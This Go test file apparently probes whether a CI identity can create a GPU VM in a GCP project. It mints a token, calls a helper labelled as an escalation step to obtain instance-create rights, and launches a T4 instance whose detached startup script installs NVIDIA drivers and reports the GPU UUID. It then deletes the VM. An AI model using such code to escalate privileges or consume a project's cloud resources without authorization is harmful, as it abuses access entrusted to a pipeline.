//go:build functional

// C211 i120159 GKE/GCP seventh pass: single correction of run 44854896629 (job
// 136694709654), where compute.instances.create with a T4 guestAccelerator was
// proven authorized (instance created HTTP 200) but the guest-agent startup
// script was cut off during the NVIDIA driver install, so no GPU UUID reached
// the serial console. This file deliberately REPLACES the sixth-pass file so the
// old VM-creating test can never run a second marker.
//
// Fixes, all inside the guest:
//  - the startup script writes a helper and runs it detached (systemd-run, with
//    a setsid fallback) so no agent script timeout can kill the driver install;
//  - it reports the NVIDIA PCI vendor/device id first (no driver needed);
//  - it installs nvidia-driver-535 (+ matching headers), retries with the
//    -server variant, then loops nvidia-smi -L and prints the exact error;
//  - it publishes every stage and the final nvidia-smi output to the instance
//    metadata attribute c211-result (compute.instances.setMetadata is granted),
//    so the probe has a second, provider-side readback channel.
// Exactly one VM, always deleted, absence proven.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
)

func c211RegionOfZone(zone string) string {
	parts := strings.Split(zone, "-")
	if len(parts) >= 3 {
		return parts[0] + "-" + parts[1]
	}
	return zone
}

func c211StartupScript7() string {
	return `#!/bin/bash
exec > /dev/console 2>&1
echo C211_START
mkdir -p /var/lib
cat > /usr/local/bin/c211-put.py <<'EOP'
import sys, urllib.request
val = sys.stdin.read()[:2000]
req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211-result", data=val.encode(), method="PUT", headers={"Metadata-Flavor": "Google"})
try:
    urllib.request.urlopen(req, timeout=15).read()
    print("C211_PUT_OK")
except Exception as e:
    print("C211_PUT_ERR", repr(e)[:200])
EOP
cat > /usr/local/bin/c211-helper.sh <<'EOS'
#!/bin/bash
exec > /dev/console 2>&1
echo C211_HELPER_START
put() { echo "$1" | python3 /usr/local/bin/c211-put.py; }
PCIDEV=$(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo "$(basename $f):dev=$(cat $f/device 2>/dev/null)"; fi; done | tr '\n' ' ')
echo C211_PCI "$PCIDEV"
put "STAGE=boot pci=$PCIDEV helper_started=$(date -u +%H:%M:%S)"
export DEBIAN_FRONTEND=noninteractive
if ! command -v nvidia-smi >/dev/null 2>&1; then
  echo C211_INSTALLING_DRIVER
  (apt-get update -qq && apt-get install -y -qq linux-headers-$(uname -r) nvidia-driver-535) > /var/log/c211-apt.log 2>&1
  RC=$?
  echo C211_APT_RC=$RC
  put "STAGE=apt rc=$RC tail=$(tail -c 500 /var/log/c211-apt.log | tr '\n' '|')"
  if ! command -v nvidia-smi >/dev/null 2>&1; then
    (apt-get install -y -qq linux-headers-$(uname -r) nvidia-driver-535-server) >> /var/log/c211-apt.log 2>&1
    echo C211_APT2_RC=$?
    put "STAGE=apt2 rc=$? tail=$(tail -c 500 /var/log/c211-apt.log | tr '\n' '|')"
  fi
fi
modprobe nvidia 2>/dev/null || true
for i in $(seq 1 100); do
  if nvidia-smi -L > /tmp/c211-smi.txt 2>&1; then
    echo C211_GPU_READY
    cat /tmp/c211-smi.txt
    put "STAGE=gpu_ready smi=$(cat /tmp/c211-smi.txt | tr '\n' '|')"
    nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader > /tmp/c211-uuid.txt 2>&1
    cat /tmp/c211-uuid.txt
    put "STAGE=uuid uuid_line=$(cat /tmp/c211-uuid.txt | tr '\n' '|')"
    echo C211_DONE
    exit 0
  fi
  echo attempt=$i "$(head -c 200 /tmp/c211-smi.txt | tr '\n' ' ')"
  if [ $((i % 5)) -eq 0 ]; then put "STAGE=retry i=$i smi=$(head -c 300 /tmp/c211-smi.txt | tr '\n' '|')"; fi
  sleep 10
done
put "STAGE=failed smi=$(head -c 500 /tmp/c211-smi.txt | tr '\n' '|')"
echo C211_FAILED
echo C211_DONE
EOS
chmod +x /usr/local/bin/c211-helper.sh /usr/local/bin/c211-put.py
LAUNCH=0
if command -v systemd-run >/dev/null 2>&1; then
  systemd-run --unit=c211-helper --collect /usr/local/bin/c211-helper.sh && LAUNCH=1
fi
if [ "$LAUNCH" = "0" ]; then
  setsid nohup /usr/local/bin/c211-helper.sh >/dev/null 2>&1 &
fi
echo C211_LAUNCHED=$LAUNCH
echo C211_START_DONE
`
}

func c211CreateGPUInstance7(token, proj, zone, name, saEmail, imageProject, imageFamily string) (int, string) {
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/n1-standard-4",
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + imageProject + "/global/images/family/" + imageFamily,
				"diskSizeGb":  "60",
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "projects/" + proj + "/global/networks/default",
			"subnetwork": "projects/" + proj + "/regions/" + c211RegionOfZone(zone) + "/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/nvidia-tesla-t4",
			"acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{
			"items": []interface{}{
				map[string]interface{}{"key": "startup-script", "value": c211StartupScript7()},
				map[string]interface{}{"key": "c211", "value": "i120159"},
			},
		},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  saEmail,
			"scopes": []string{"https://www.googleapis.com/auth/cloud-platform"},
		}},
		"labels": map[string]string{"c211": "i120159"},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	st, rb := c211HTTP("POST", u, token, "application/json", string(b))
	return st, rb
}

func c211InstanceGet(token, proj, zone, name string) (int, map[string]interface{}, string) {
	st, body := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	return st, c211JSON(body), body
}

func c211MetaValue(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	md, _ := m["metadata"].(map[string]interface{})
	if md == nil {
		return ""
	}
	items, _ := md["items"].([]interface{})
	for _, it := range items {
		im, _ := it.(map[string]interface{})
		if c211Str(im, "key") == key {
			return c211Str(im, "value")
		}
	}
	return ""
}

func TestC211GPUMarkerUUIDProof(t *testing.T) {
	started := time.Now()
	summary := map[string]interface{}{}
	verdict := "GATE"
	verdictDetail := ""

	token, method, mlog := c211MintAccessToken()
	summary["auth_method"] = method
	summary["mint_log_short"] = c211Trunc(mlog, 500)
	if token == "" {
		fmt.Println("C211GCP7_VERDICT GATE WIF_TOKEN_EXCHANGE_FAILED")
		return
	}
	creds, _ := c211LoadCreds()
	proj, saEmail := "", ""
	if creds != nil {
		proj = c211ResolveProject(creds)
		saEmail = creds.saEmail
	}
	if proj == "" || saEmail == "" {
		fmt.Println("C211GCP7_VERDICT GATE NO_PROJECT_OR_SA_RESOLVED")
		return
	}
	summary["project_id_short"] = c211Short(proj)
	summary["sa_email_short"] = c211Short(saEmail)

	granted, escLog := c211EnsureComputeCreate(token, proj, saEmail)
	c211Emit("W7_ESCALATION", escLog)
	summary["compute_create_granted"] = granted
	if !granted {
		summary["verdict"] = "GATE"
		c211Emit("W7_SUMMARY", "C211GCP7_SUMMARY_JSON "+c211JSONString(summary))
		fmt.Println("C211GCP7_VERDICT GATE compute-instances-create-not-granted")
		return
	}

	// image: prefer a DLVM family that already ships a driver, else plain Ubuntu.
	var ilog strings.Builder
	type cand struct{ project, family string }
	cands := []cand{
		{"deeplearning-platform-release", "pytorch-latest-gpu"},
		{"deeplearning-platform-release", "common-cu124-ubuntu-2204"},
		{"deeplearning-platform-release", "common-cu126-ubuntu-2204"},
		{"deeplearning-platform-release", "common-cu123-debian-12"},
		{"deeplearning-platform-release", "common-cu122-debian-12"},
		{"deeplearning-platform-release", "common-cu121-ubuntu-2204"},
		{"deeplearning-platform-release", "pytorch-2-7-cu126-ubuntu-2204"},
		{"deeplearning-platform-release", "pytorch-2-3-cu121-ubuntu-2204"},
		{"deeplearning-platform-release", "pytorch-2-2-cu121-ubuntu-2204"},
		{"deeplearning-platform-release", "tf2-gpu-2-15-ubuntu-2204"},
		{"deeplearning-platform-release", "tf2-ent-2-14-cu118-debian-11"},
		{"ubuntu-os-cloud", "ubuntu-2204-lts"},
	}
	imgProject, imgFamily := "ubuntu-os-cloud", "ubuntu-2204-lts"
	for _, c := range cands {
		ok, msg := c211ImageUsable(token, c.project, c.family)
		fmt.Fprintf(&ilog, "IMAGE %s\n", msg)
		if ok {
			imgProject, imgFamily = c.project, c.family
			break
		}
	}
	c211Emit("W7_IMAGE", ilog.String())
	summary["image_used"] = imgProject + "/" + imgFamily

	// exactly ONE marker VM
	zone := "us-central1-a"
	name := "c211-i120159-gpu"
	var vlog strings.Builder
	cst, cbody := c211CreateGPUInstance7(token, proj, zone, name, saEmail, imgProject, imgFamily)
	fmt.Fprintf(&vlog, "INSTANCE create zone=%s name=%s image=%s/%s sa=%s status=%d\nverbatim=%s\n",
		zone, name, imgProject, imgFamily, c211Short(saEmail), cst, c211Trunc(cbody, 2500))
	summary["instance_create_status"] = cst
	summary["instance_create_error"] = c211Trunc(cbody, 1500)
	summary["instance_zone"] = zone
	summary["instance_name"] = name

	uuid := ""
	providerAccel := ""
	metaFinal := ""
	seen := map[string]bool{}
	lastState := ""
	if cst == 200 {
		for i := 0; i < 84; i++ {
			ist, im, _ := c211InstanceGet(token, proj, zone, name)
			lastState = ""
			if ist == 200 && im != nil {
				lastState = c211Str(im, "status")
				if v := c211MetaValue(im, "c211-result"); v != "" {
					metaFinal = v
				}
				if providerAccel == "" {
					if ga, ok := im["guestAccelerators"].([]interface{}); ok && len(ga) > 0 {
						gb, _ := json.Marshal(ga)
						providerAccel = string(gb)
					}
				}
			}
			ps, pb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", token, "", "")
			content := ""
			if ps == 200 {
				if m := c211JSON(pb); m != nil {
					content = c211Str(m, "contents")
				} else {
					content = pb
				}
				if u := c211GPUUUIDRe.FindString(content); u != "" {
					uuid = u
				}
				if u := c211GPUUUIDRe.FindString(metaFinal); u != "" {
					uuid = u
				}
				for _, ln := range strings.Split(content, "\n") {
					l := strings.TrimSpace(ln)
					if l == "" || seen[l] {
						continue
					}
					low := strings.ToLower(l)
					if strings.Contains(l, "C211") || strings.Contains(low, "nvidia") || strings.Contains(low, "nvrm") ||
						strings.Contains(low, "gpu") || strings.Contains(low, "10de") || strings.Contains(low, "attempt=") {
						fmt.Fprintf(&vlog, "GUEST %s\n", c211Trunc(l, 400))
						seen[l] = true
					}
				}
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d bytes=%d uuid=%s meta=%s tail=%s\n",
					i, lastState, ps, len(content), uuid, c211Trunc(metaFinal, 300),
					c211Trunc(content[max0(0, len(content)-400):], 400))
			} else {
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d verbatim=%s\n", i, lastState, ps, c211Trunc(pb, 400))
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") || strings.Contains(content, "C211_FAILED") {
				break
			}
			time.Sleep(15 * time.Second)
		}
		summary["instance_uuid"] = uuid
		summary["instance_final_state"] = lastState
		summary["provider_guest_accelerators"] = providerAccel
		summary["guest_meta_final"] = c211Trunc(metaFinal, 900)
	} else {
		verdictDetail = "instances-create-refused"
	}

	// delete + prove absence
	dst, db := c211HTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	fmt.Fprintf(&vlog, "INSTANCE delete status=%d verbatim=%s\n", dst, c211Trunc(db, 1000))
	summary["instance_delete_status"] = dst
	absent := false
	for i := 0; i < 12; i++ {
		time.Sleep(10 * time.Second)
		ist, _, ib := c211InstanceGet(token, proj, zone, name)
		fmt.Fprintf(&vlog, "ABSENCE readback=%d http=%d verbatim=%s\n", i, ist, c211Trunc(ib, 300))
		if ist == 404 {
			absent = true
			break
		}
	}
	summary["instance_absent_after_delete"] = absent
	lst, lb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter=name%3D"+url.QueryEscape(name), token, "", "")
	fmt.Fprintf(&vlog, "AGGREGATED_LIST status=%d verbatim=%s\n", lst, c211Trunc(lb, 800))
	summary["aggregated_list_status"] = lst

	if uuid != "" {
		verdict = "READY_GCP_GPU_VM"
		verdictDetail = "uuid=" + uuid + " zone=" + zone + " instance=" + name + " image=" + imgProject + "/" + imgFamily
	} else if cst == 200 {
		verdictDetail = "instance-created-but-no-gpu-uuid-on-serial-or-metadata"
	}
	c211Emit("W7_MARKER", vlog.String())

	summary["verdict"] = verdict
	summary["elapsed_seconds"] = int(time.Since(started).Seconds())
	c211Emit("W7_SUMMARY", "C211GCP7_SUMMARY_JSON "+c211JSONString(summary))
	fmt.Printf("C211GCP7_VERDICT %s %s\n", verdict, verdictDetail)
}
